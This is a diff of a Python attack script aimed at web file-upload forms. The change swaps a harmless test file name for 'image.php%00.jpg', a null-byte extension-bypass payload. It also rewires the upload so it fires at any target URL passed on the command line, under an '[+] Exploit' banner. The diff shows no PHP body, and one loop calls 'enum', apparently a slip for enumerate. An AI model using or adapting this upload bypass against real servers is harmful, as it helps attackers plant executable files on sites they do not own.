@@ -64,8 +64,6 @@ def upload_files(url, files_dict, extra_params=None):
     r = requests.post(url, files=files, data=extra_params or {})
     return r
 
-
-
 payloads = {
     "file1": {
         "file_name": "sample.txt",
@@ -73,24 +71,19 @@ payloads = {
         "content": "Ceci est un test."
     },
     "file2": {
-        "file_name": "image.fake.jpg",
+        "file_name": "image.php%00.jpg",
         "mime": "image/jpeg",
         "content": b"\xff\xd8\xff\xe0"  # header JPEG
     }
 }
 
-resp = upload_files(
-    url="http://test.local/upload",
-    files_dict=payloads,
-    extra_params={"submit": "OK"}
-)
-
-print(resp.status_code)
-print(resp.text[:500])
-
 if args.url:
     print(f"[+] Exploit {args.url}")
     response = upload(args.url)
+    resp = upload_files(url=args.url, files_dict=payloads, extra_params={"submit": "OK"})
+
+    print(resp.status_code)
+    print(resp.text[:500])
     if len(response) >= 2:
         for idx, var in enum(response):
             print(f"[{idx}] {var}")
